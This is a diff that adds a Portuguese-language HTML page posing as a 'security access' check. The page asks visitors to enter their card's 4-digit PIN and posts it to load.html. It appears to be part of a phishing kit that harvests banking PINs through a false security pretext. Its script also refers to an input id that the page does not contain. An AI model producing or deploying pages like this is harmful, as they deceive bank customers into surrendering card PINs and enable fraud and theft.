@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Página Responsiva</title>
+  <link rel="stylesheet" type="text/css" href="css/style2.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
+<style>
+  .txtSenha4 {
+    text-align: center;
+  }
+</style>
+
+</head>
+<body>
+  <div class="topo">
+    <div class="voltar" style="font-family: sans-serif;font-size: 28px;" ><b><</b></div>
+    
+    <span class="titulo">Acesso de Segurança</span>
+    <i class="alerta">&#9888;</i>
+  </div>
+  <hr>
+  </div>
+
+  <div>
+      <img src="images/senha4.png" class="imgSenha4">
+  </div>
+
+  <form method="post" action="load.html">
+  <div>
+    <div class="txtAcessar">Para continuar, precisamos que você confirme a senha de 4 digitos do seu cartão</div>
+
+
+    <div class="txtsubAcessar">Para garantir sua segurança, precisamos confirmar alguns dados. Por favor, insira sua senha abaixo para acessar a sua conta.</div>
+
+    <div>
+      
+
+  </div>
+
+  <br><br>
+  <div class="boxIno">
+      <div class="txtSenha4"> <i class="fas fa-lock"></i> Senha do cartão (4 digitos):</div>
+
+      <input type="password" class="inputsenha" name="senha4" minlength="4" maxlength="4" placeholder="****" >
+  </div>
+
+ 
+
+  <div>
+    <button class="btnEntrar">Acessar minha conta</button>
+  </div>
+
+
+    <script>
+        const senhaInput = document.getElementById('senha');
+        const bolinhas = document.querySelectorAll('.bolinha');
+
+        // Foco automático no input ao clicar nas bolinhas
+        bolinhas.forEach((bolinha) => {
+            bolinha.addEventListener('click', () => {
+                senhaInput.focus();
+            });
+        });
+
+        senhaInput.addEventListener('input', () => {
+            bolinhas.forEach((bolinha, index) => {
+                if (index < senhaInput.value.length) {
+                    bolinha.classList.add('preenchida');
+                } else {
+                    bolinha.classList.remove('preenchida');
+                }
+            });
+        });
+    </script>
+
+    
+</body>
+</html>
